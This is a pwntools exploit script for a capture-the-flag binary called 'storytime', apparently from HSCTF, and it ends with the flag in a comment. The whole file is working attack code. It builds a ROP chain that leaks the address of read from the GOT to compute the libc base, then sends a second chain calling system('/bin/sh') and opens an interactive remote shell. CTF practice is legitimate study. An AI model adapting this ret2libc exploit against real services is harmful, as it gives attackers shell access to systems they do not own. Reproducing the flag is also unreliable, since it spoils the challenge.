from pwn import *

prog = ELF('storytime')
local = False
host = 'localhost' if local else 'pwn.hsctf.com'
port = 1337 if local else 3333
libc = prog.libc if local else ELF('libc.so')



if __name__ == '__main__':
    rop = ROP(prog)
    binsh = next(libc.search('/bin/sh'))
    gotread = prog.got[b'read']
    offset_read = libc.symbols[b'read']
    system_off = libc.symbols[b'system']
    gadget = 'pop .si;'
    pop2ret = int([hex(x) for x in rop.gadgets if re.match(gadget, rop.describe(x))][0], 16)
    s= remote(host, port)
    print(s.recvuntil('\n').decode())
    print(s.recvuntil('\n').decode())
    exp = p64(pop2ret)*8+p64(gotread)*2+p64(prog.plt[b'write'])+p64(prog.symbols[b'main'])+b'\n'
    s.send(exp)
    read = u64(s.recv(8))
    base = read - offset_read
    binsh += base
    print(hex(binsh))
    system = base + system_off
    print(s.recvuntil('\n'))
    print(s.recvuntil('\n').decode())
    gadget = 'pop .di;\s*ret'
    popret = int([hex(x) for x in rop.gadgets if re.match(gadget, rop.describe(x))][0], 16)
    print(hex(popret))
    exp = p64(popret)*8+p64(binsh)+p64(system)+b'\n'
    s.send(exp)
    s.interactive()
    #Flag = hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}
